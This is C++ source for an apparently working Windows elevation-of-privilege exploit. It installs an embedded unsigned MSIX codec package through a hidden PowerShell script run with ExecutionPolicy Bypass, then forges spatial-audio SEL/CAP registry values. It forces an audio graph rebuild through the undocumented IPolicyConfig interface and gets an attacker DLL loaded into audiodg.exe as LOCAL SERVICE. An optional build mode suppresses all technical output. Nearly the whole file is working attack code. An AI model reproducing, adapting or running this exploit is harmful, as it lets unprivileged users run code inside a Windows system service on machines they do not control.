// aio_za_v3.exe -- zero-admin spatial-audio codec EoP, PROACTIVE (no wait-for-idle).
// Instead of waiting for audiodg to idle-exit, it forges SEL/CAP then FORCES the endpoint's
// audio graph to rebuild via a default-device flip (IPolicyConfig, non-admin), so the fresh
// graph re-reads our forged spatial config immediately -- even while audio is playing.
//
// Build: rc /fo aio_za_v3.res aio_za.rc && cl /MT aio_za_v3.cpp aio_za_v3.res

#include <windows.h>
#include <mmdeviceapi.h>
#include <spatialaudioclient.h>
#include <audioclient.h>
#include <objbase.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <mmsystem.h>
#include <stdio.h>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "winmm.lib")

// Self-contained "keep audiodg busy" via an embedded looping tone (MUSIC WAVE resource).
static void startMusic(){ PlaySoundW(L"MUSIC", GetModuleHandleW(NULL), SND_RESOURCE|SND_ASYNC|SND_LOOP); }
static void stopMusic(){ PlaySoundW(NULL, NULL, 0); }

static const wchar_t* PKGNAME   = L"CodecHostPoc";
static const wchar_t* MSIXPATH  = L"C:\\Users\\Public\\codechost_poc.msix";
static const wchar_t* V_CAP     = L"{fd8a7b27-0b18-4025-ab1c-bdd6b32e1604},2";
static const wchar_t* V_SEL     = L"{908dba32-edff-4c28-8e45-c918561f6748},2";
static const wchar_t* RENDERBASE= L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\MMDevices\\Audio\\Render";
static const GUID ENC = { 0x1459AC38, 0x3875, 0x49BF, { 0xBB,0x59,0x0F,0xE8,0x0F,0x4D,0x39,0x5D } };
static const char* CAP_HEX =
 "41000000010000000200005a"
 "0c943db546b831489f76d102b9b725a0"
 "feff0f000100000080000000a0400000a0400000a0400000000000000000000000000000"
 "f0410000b4420000074300003442a4705f42ae47f842"
 "0000803f0000803f0000803f0000803f0000803f0000803f0000803f0000803f"
 "96433b3fbf0e1c3f0000803fbf0e1c3fd39ffd3ed39ffd3e0000803f0000000000000000";

// IPolicyConfig (undocumented, non-admin). On Win11 26200 the live combo is
// CLSID {294935CE-...} + IID_IPolicyConfigVista {568b9108-...}; SetDefaultEndpoint is at vtable index 12.
static const CLSID CLSID_PolicyConfig = {0x294935CE,0xF637,0x4E7C,{0xA4,0x1B,0xAB,0x25,0x54,0x60,0xB8,0x62}};
static const IID   IID_IPolicyConfig  = {0x568b9108,0x44bf,0x40b4,{0x90,0x06,0x86,0xaf,0xe5,0xb5,0xa6,0x20}};
typedef HRESULT (STDMETHODCALLTYPE *PFN_SetDefaultEndpoint)(IUnknown*, PCWSTR, int /*ERole*/);
typedef HRESULT (STDMETHODCALLTYPE *PFN_GetDeviceFormat)(IUnknown*, PCWSTR, int /*bDefault*/, WAVEFORMATEX**);
typedef HRESULT (STDMETHODCALLTYPE *PFN_SetDeviceFormat)(IUnknown*, PCWSTR, WAVEFORMATEX*, WAVEFORMATEX*);

#ifdef SKIBIDI
static void logf(const char* fmt, ...) { (void)fmt; }   // skibidi build: swallow all technical output
static DWORD WINAPI skibidiThread(LPVOID) { for(;;){ printf("skibidi\n"); fflush(stdout); Sleep(3000); } return 0; }
#else
static void logf(const char* fmt, ...) { va_list ap; va_start(ap,fmt); vprintf(fmt,ap); va_end(ap); printf("\n"); fflush(stdout); }
#endif
static int hexval(char c){ if(c>='0'&&c<='9')return c-'0'; if(c>='a'&&c<='f')return c-'a'+10; if(c>='A'&&c<='F')return c-'A'+10; return -1; }
static int hex2bytes(const char* hex, BYTE* out, int outmax){ int n=0; for(const char*p=hex;p[0]&&p[1];p+=2){int hi=hexval(p[0]),lo=hexval(p[1]); if(hi<0||lo<0)break; if(n>=outmax)break; out[n++]=(BYTE)((hi<<4)|lo);} return n; }
static bool extractResource(const char* resName, const wchar_t* outPath){
    HRSRC hr=FindResourceA(NULL,resName,RT_RCDATA); if(!hr){ logf("  [!] resource %s not found",resName); return false; }
    DWORD sz=SizeofResource(NULL,hr); HGLOBAL hg=LoadResource(NULL,hr); if(!hg) return false;
    void* p=LockResource(hg); if(!p||!sz) return false;
    HANDLE h=CreateFileW(outPath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(h==INVALID_HANDLE_VALUE){ logf("  [!] cannot write %ws (err %lu)",outPath,GetLastError()); return false; }
    DWORD w=0; BOOL ok=WriteFile(h,p,sz,&w,NULL); CloseHandle(h); return ok && w==sz;
}
static int runPowerShell(const wchar_t* ps){
    wchar_t cmd[1024]; _snwprintf_s(cmd,_countof(cmd),_TRUNCATE,L"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%ws\"",ps);
    STARTUPINFOW si={0}; si.cb=sizeof(si); si.dwFlags=STARTF_USESHOWWINDOW; si.wShowWindow=SW_HIDE; PROCESS_INFORMATION pi={0};
    if(!CreateProcessW(NULL,cmd,NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)){ logf("  [!] CreateProcess(powershell) err %lu",GetLastError()); return -1; }
    WaitForSingleObject(pi.hProcess,120000); DWORD ec=0; GetExitCodeProcess(pi.hProcess,&ec);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return (int)ec;
}
static bool audiodgRunning(){
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0); if(snap==INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W pe; pe.dwSize=sizeof(pe); bool found=false;
    if(Process32FirstW(snap,&pe)){ do{ if(_wcsicmp(pe.szExeFile,L"audiodg.exe")==0){found=true;break;} }while(Process32NextW(snap,&pe)); }
    CloseHandle(snap); return found;
}
static bool openProps(const wchar_t* sub, REGSAM sam, HKEY* out){ wchar_t path[512]; _snwprintf_s(path,_countof(path),_TRUNCATE,L"%ws\\%ws\\Properties",RENDERBASE,sub); return RegOpenKeyExW(HKEY_LOCAL_MACHINE,path,0,sam,out)==ERROR_SUCCESS; }
static bool findEndpointSubkey(const wchar_t* idTail, wchar_t* outSub, int outcch){
    HKEY hRoot; if(RegOpenKeyExW(HKEY_LOCAL_MACHINE,RENDERBASE,0,KEY_ENUMERATE_SUB_KEYS|KEY_READ,&hRoot)!=ERROR_SUCCESS) return false;
    wchar_t inner[128]={0}; { const wchar_t*s=idTail; int j=0; for(;*s&&j<127;s++){ if(*s!=L'{'&&*s!=L'}') inner[j++]=*s; } inner[j]=0; }
    wchar_t name[256]; DWORD idx=0,cch; bool found=false;
    for(;;){ cch=_countof(name); LONG r=RegEnumKeyExW(hRoot,idx++,name,&cch,NULL,NULL,NULL,NULL); if(r!=ERROR_SUCCESS)break;
        wchar_t low[256]; wcscpy_s(low,name); _wcslwr_s(low); wchar_t lin[128]; wcscpy_s(lin,inner); _wcslwr_s(lin);
        if(StrStrW(low,lin)){ wcsncpy_s(outSub,outcch,name,_TRUNCATE); found=true; break; } }
    RegCloseKey(hRoot); return found;
}
static int  saveValue(const wchar_t* sub,const wchar_t* val,BYTE* buf,int bufmax){ HKEY h; if(!openProps(sub,KEY_QUERY_VALUE,&h))return -1; DWORD type=0,cb=bufmax; LONG r=RegQueryValueExW(h,val,NULL,&type,buf,&cb); RegCloseKey(h); return (r==ERROR_SUCCESS)?(int)cb:-1; }
static bool writeValue(const wchar_t* sub,const wchar_t* val,const BYTE* data,int len){ HKEY h; if(!openProps(sub,KEY_SET_VALUE,&h))return false; LONG r=RegSetValueExW(h,val,0,REG_BINARY,data,len); RegCloseKey(h); return r==ERROR_SUCCESS; }
static void deleteValue(const wchar_t* sub,const wchar_t* val){ HKEY h; if(openProps(sub,KEY_SET_VALUE,&h)){ RegDeleteValueW(h,val); RegCloseKey(h);} }

// return full default render endpoint id (e.g. "{0.0.0.00000000}.{guid}") and its tail
static bool getDefaultEndpoint(wchar_t* fullId,int fcch, wchar_t* tail,int tcch){
    IMMDeviceEnumerator* e=NULL; bool ok=false;
    if(SUCCEEDED(CoCreateInstance(__uuidof(MMDeviceEnumerator),NULL,CLSCTX_INPROC_SERVER,IID_PPV_ARGS(&e)))){
        IMMDevice* d=NULL;
        if(SUCCEEDED(e->GetDefaultAudioEndpoint(eRender,eConsole,&d))){
            LPWSTR id=NULL;
            if(SUCCEEDED(d->GetId(&id))&&id){ wcsncpy_s(fullId,fcch,id,_TRUNCATE); const wchar_t* dot=wcsrchr(id,L'.'); wcsncpy_s(tail,tcch,dot?dot+1:id,_TRUNCATE); ok=true; CoTaskMemFree(id); }
            d->Release();
        }
        e->Release();
    }
    return ok;
}

// PROACTIVE: force the target endpoint's audio graph to rebuild (re-read forged SEL/CAP) via
// a default-device flip -- works even while audio is playing, no wait-for-idle.
static bool forceRebuild(const wchar_t* targetFullId){
    IUnknown* pc=NULL;
    HRESULT hr=CoCreateInstance(CLSID_PolicyConfig,NULL,CLSCTX_ALL,IID_IPolicyConfig,(void**)&pc);
    if(FAILED(hr)||!pc){ logf("  [!] IPolicyConfig 0x%08X",hr); return false; }
    void** vtbl=*(void***)pc;
    PFN_GetDeviceFormat GetDeviceFormat=(PFN_GetDeviceFormat)vtbl[4];
    PFN_SetDeviceFormat SetDeviceFormat=(PFN_SetDeviceFormat)vtbl[5];
    PFN_SetDefaultEndpoint SetDefaultEndpoint=(PFN_SetDefaultEndpoint)vtbl[12];

    // Method 1 (primary): re-set the endpoint's device format -> forces the audio engine to
    // tear down and re-init THIS endpoint's graph (re-reading the forged spatial SEL/CAP).
    // Needs no second device. We fetch the current format and set it straight back.
    WAVEFORMATEX* wf=NULL;
    hr=GetDeviceFormat(pc,targetFullId,1,&wf);
    if(SUCCEEDED(hr)&&wf){
        HRESULT hs=SetDeviceFormat(pc,targetFullId,wf,wf);
        logf("  SetDeviceFormat re-init -> 0x%08X",hs);
        CoTaskMemFree(wf);
    } else logf("  GetDeviceFormat -> 0x%08X",hr);

    // Method 2 (secondary): default-endpoint flip if another endpoint exists (any state).
    wchar_t other[256]={0};
    IMMDeviceEnumerator* e=NULL;
    if(SUCCEEDED(CoCreateInstance(__uuidof(MMDeviceEnumerator),NULL,CLSCTX_INPROC_SERVER,IID_PPV_ARGS(&e)))){
        IMMDeviceCollection* col=NULL;
        if(SUCCEEDED(e->EnumAudioEndpoints(eRender,0x0000000F /*all states -> find any 'other' to flip through*/,&col))){
            UINT n=0; col->GetCount(&n);
            for(UINT i=0;i<n && !other[0];i++){ IMMDevice* d=NULL; if(SUCCEEDED(col->Item(i,&d))){ LPWSTR id=NULL; if(SUCCEEDED(d->GetId(&id))&&id){ if(_wcsicmp(id,targetFullId)!=0) wcsncpy_s(other,_countof(other),id,_TRUNCATE); CoTaskMemFree(id);} d->Release(); } }
            col->Release();
        }
        e->Release();
    }
    if(other[0]){ for(int role=0;role<3;role++) SetDefaultEndpoint(pc,other,role); Sleep(200);
                  for(int role=0;role<3;role++) SetDefaultEndpoint(pc,targetFullId,role); Sleep(200);
                  logf("  default-endpoint flip off->on done"); }
    Sleep(200);
    pc->Release();
    return true;
}

static HRESULT triggerSpatial(bool* markerOut){
    HRESULT hr; IMMDeviceEnumerator* pEnum=NULL;
    hr=CoCreateInstance(__uuidof(MMDeviceEnumerator),NULL,CLSCTX_INPROC_SERVER,IID_PPV_ARGS(&pEnum)); if(FAILED(hr)){ logf("  [!] enum 0x%08X",hr); return hr; }
    IMMDevice* pDev=NULL; hr=pEnum->GetDefaultAudioEndpoint(eRender,eConsole,&pDev); if(FAILED(hr)){ logf("  [!] getdefault 0x%08X",hr); pEnum->Release(); return hr; }
    ISpatialAudioClient* pSAC=NULL; hr=pDev->Activate(__uuidof(ISpatialAudioClient),CLSCTX_INPROC_SERVER,NULL,(void**)&pSAC);
    if(FAILED(hr)){ logf("  [!] activate 0x%08X",hr); pDev->Release(); pEnum->Release(); return hr; }
    UINT32 maxDyn=0; if(FAILED(pSAC->GetMaxDynamicObjectCount(&maxDyn))) maxDyn=0; logf("  MaxDynamicObjectCount = %u",maxDyn);
    WAVEFORMATEX fmt={0}; fmt.wFormatTag=WAVE_FORMAT_IEEE_FLOAT; fmt.nChannels=1; fmt.nSamplesPerSec=48000; fmt.wBitsPerSample=32; fmt.nBlockAlign=4; fmt.nAvgBytesPerSec=192000;
    HANDLE hEv=CreateEventW(NULL,FALSE,FALSE,NULL);
    UINT32 cands[3]; int nc=0; UINT32 first=(maxDyn>0?maxDyn:1); cands[nc++]=first; if(first!=1)cands[nc++]=1; cands[nc++]=0;
    ISpatialAudioObjectRenderStream* pStream=NULL;
    for(int ci=0;ci<nc&&!pStream;ci++){
        SpatialAudioObjectRenderStreamActivationParams params={0}; params.ObjectFormat=&fmt; params.StaticObjectTypeMask=AudioObjectType_None;
        params.MinDynamicObjectCount=0; params.MaxDynamicObjectCount=cands[ci]; params.Category=(AUDIO_STREAM_CATEGORY)6; params.EventHandle=hEv;
        PROPVARIANT pv; ZeroMemory(&pv,sizeof(pv)); pv.vt=VT_BLOB; pv.blob.cbSize=sizeof(params); pv.blob.pBlobData=(BYTE*)&params;
        hr=pSAC->ActivateSpatialAudioStream(&pv,__uuidof(ISpatialAudioObjectRenderStream),(void**)&pStream);
        if(FAILED(hr)){ logf("  ActivateSpatialAudioStream(mc=%u) 0x%08X",cands[ci],hr); pStream=NULL; } else logf("  ActivateSpatialAudioStream(mc=%u) OK",cands[ci]);
    }
    if(pStream){ pStream->Start();
        for(int i=0;i<80;i++){ WaitForSingleObject(hEv,120); UINT32 a=0,f=0;
            if(SUCCEEDED(pStream->BeginUpdatingAudioObjects(&a,&f))){ ISpatialAudioObject* o=NULL; pStream->ActivateSpatialAudioObject(AudioObjectType_Dynamic,&o); if(o)o->Release(); pStream->EndUpdatingAudioObjects(); }
            if(GetFileAttributesW(L"C:\\Users\\Public\\audiodg_pwn")!=INVALID_FILE_ATTRIBUTES){ *markerOut=true; logf("  marker observed after ~%dms",(i+1)*120); break; } }
        pStream->Stop(); pStream->Release(); }
    if(hEv)CloseHandle(hEv); pSAC->Release(); pDev->Release(); pEnum->Release(); return hr;
}

int wmain(int argc, wchar_t** argv){
#ifdef SKIBIDI
    CreateThread(NULL, 0, skibidiThread, NULL, 0, NULL);   // meme mode: print "skibidi" every 3s, nothing else
#endif
    logf("=== spatial-audio codec EoP  --  all-in-one v3 (UNSIGNED / zero-admin / PROACTIVE, no idle-wait) ===");
    bool exploitOnly=false;
    for(int i=1;i<argc;i++){ if(!_wcsicmp(argv[i],L"--exploit-only")||!_wcsicmp(argv[i],L"-x")) exploitOnly=true; }
    if(exploitOnly) logf("MODE: --exploit-only");
    logf("");

  if(!exploitOnly){
    logf("[1] extracting embedded unsigned codec package -> %ws", MSIXPATH);
    CreateDirectoryW(L"C:\\Users\\Public",NULL);
    if(!extractResource("CODECMSIX",MSIXPATH)){ logf("[x] extract failed"); return 2; }
    logf("[2] registering UNSIGNED package (Add-AppxPackage -AllowUnsigned)");
    {
        const wchar_t* flag=L"C:\\Users\\Public\\codec_reg_ok.flag"; DeleteFileW(flag);
        const wchar_t* ps=L"C:\\Users\\Public\\codec_reg.ps1"; FILE* f=NULL; _wfopen_s(&f,ps,L"w,ccs=UTF-8");
        if(f){ fwprintf(f,L"$ErrorActionPreference='Continue'\r\n");
            fwprintf(f,L"try { Get-AppxPackage -Name %ws -EA SilentlyContinue | Remove-AppxPackage -EA SilentlyContinue } catch {}\r\n",PKGNAME);
            fwprintf(f,L"try { Add-AppxPackage -Path '%ws' -AllowUnsigned -EA Stop; $p=Get-AppxPackage -Name %ws; if($p){ Set-Content '%ws' $p.PackageFullName -Encoding ascii; Write-Host ('REGISTERED: '+$p.PackageFullName+'  sig='+$p.SignatureKind) } } catch { Write-Host ('REG FAIL: '+$_.Exception.Message); Write-Host ('HR 0x{0:X8}' -f ($_.Exception.HResult -band 0xffffffff)) }\r\n",MSIXPATH,PKGNAME,flag);
            fclose(f); }
        runPowerShell(ps);
        if(GetFileAttributesW(flag)==INVALID_FILE_ATTRIBUTES){ logf("[x] unsigned registration failed"); return 3; }
        logf("  registration OK (UNSIGNED, non-admin)");
    }
  }

    logf("[3] discovering default render endpoint");
    CoInitializeEx(NULL,COINIT_APARTMENTTHREADED);
    wchar_t fullId[256]={0}, tail[128]={0};
    if(!getDefaultEndpoint(fullId,_countof(fullId),tail,_countof(tail))){ logf("[x] no default render endpoint"); CoUninitialize(); return 4; }
    logf("  full id : %ws", fullId);
    wchar_t sub[256]={0}; if(!findEndpointSubkey(tail,sub,_countof(sub))) wcsncpy_s(sub,_countof(sub),tail,_TRUNCATE);
    logf("  registry subkey: %ws", sub);

    // Keep audiodg BUSY ourselves (embedded looping tone) so it is already live -- holding the OLD
    // config -- BEFORE we forge. This is the real "audio playing, cannot wait for idle" scenario.
    logf("[3b] starting embedded audio to make audiodg live (no external media needed)");
    startMusic();
    for(int i=0;i<20 && !audiodgRunning();i++) Sleep(150);
    logf("  audiodg live: %s", audiodgRunning()?"yes":"no");
    Sleep(600); // let the endpoint graph settle on the current (unforged) config

    logf("[4] saving current SEL/CAP");
    BYTE savCap[1024],savSel[1024]; int nCap=saveValue(sub,V_CAP,savCap,sizeof(savCap)); int nSel=saveValue(sub,V_SEL,savSel,sizeof(savSel));
    logf("  saved CAP=%d SEL=%d bytes", nCap, nSel);

    logf("[5] forging Atmos SEL/CAP (encoder {1459AC38-...})");
    { BYTE cap[256]; int capn=hex2bytes(CAP_HEX,cap,sizeof(cap)); memcpy(cap+12,&ENC,16); writeValue(sub,V_CAP,cap,capn);
      BYTE sel[84]; ZeroMemory(sel,sizeof(sel)); BYTE hdr[8]={0x41,0,0,0,0x01,0,0,0}; memcpy(sel,hdr,8);
      *(DWORD*)(sel+8)=0x5a000002; *(DWORD*)(sel+12)=1; memcpy(sel+0x18,&ENC,16); writeValue(sub,V_SEL,sel,sizeof(sel)); logf("  forged."); }

    logf("[6] PROACTIVE: forcing endpoint graph rebuild if audiodg is live");
    RemoveDirectoryW(L"C:\\Users\\Public\\audiodg_pwn");
    bool live = audiodgRunning();
    if(live){
        // audiodg is already up (audio playing) -> it holds the OLD config and will not re-read
        // on its own. Force the endpoint graph to re-init so it re-reads our forged SEL/CAP.
        logf("  audiodg is LIVE -> forcing endpoint re-init (SetDeviceFormat)");
        forceRebuild(fullId);
    } else {
        // audiodg is idle/down -> the trigger will spawn a FRESH audiodg that reads the forged
        // config directly. Do NOT force a re-init here: with no live graph, AudioSrv re-evaluates
        // and RESETS the endpoint's spatial SEL/CAP, wiping our forge before we can trigger.
        logf("  audiodg is idle/down -> fresh instance will read the forged config on trigger (no rebuild)");
    }

    logf("[7] triggering ISpatialAudioClient::ActivateSpatialAudioStream");
    bool marker=false; triggerSpatial(&marker);
    // one retry if not yet fired (belt & suspenders, still no long wait)
    if(!marker && GetFileAttributesW(L"C:\\Users\\Public\\audiodg_pwn")==INVALID_FILE_ATTRIBUTES){
        logf("  retry: %s + trigger once more", audiodgRunning()?"rebuild":"re-trigger");
        if(audiodgRunning()) forceRebuild(fullId);
        triggerSpatial(&marker);
    }
    Sleep(500);
    bool dir=GetFileAttributesW(L"C:\\Users\\Public\\audiodg_pwn")!=INVALID_FILE_ATTRIBUTES;
    HANDLE ev=OpenEventW(SYNCHRONIZE,FALSE,L"Global\\audiodg_pwn");

    logf("");
    logf("[8] result");
    if(dir||marker||ev){
        logf("  *** SUCCESS: proof.dll executed inside audiodg.exe as LOCAL SERVICE (proactive, no idle-wait) ***");
        HANDLE hf=CreateFileW(L"C:\\Users\\Public\\audiodg_pwn_whoami.txt",GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
        if(hf!=INVALID_HANDLE_VALUE){ char b[4096]; DWORD r=0; if(ReadFile(hf,b,sizeof(b)-1,&r,NULL)){ b[r]=0; logf("  ---- audiodg_pwn_whoami.txt ----\n%s",b);} CloseHandle(hf);}
    } else logf("  [x] no marker (rebuild path did not force a re-read on this box)");
    if(ev)CloseHandle(ev);
    stopMusic();
    if(nCap>=0) writeValue(sub,V_CAP,savCap,nCap); else deleteValue(sub,V_CAP);
    if(nSel>=0) writeValue(sub,V_SEL,savSel,nSel); else deleteValue(sub,V_SEL);
    logf("  restored original SEL/CAP");
    CoUninitialize();
    return (dir||marker||ev)?0:1;
}
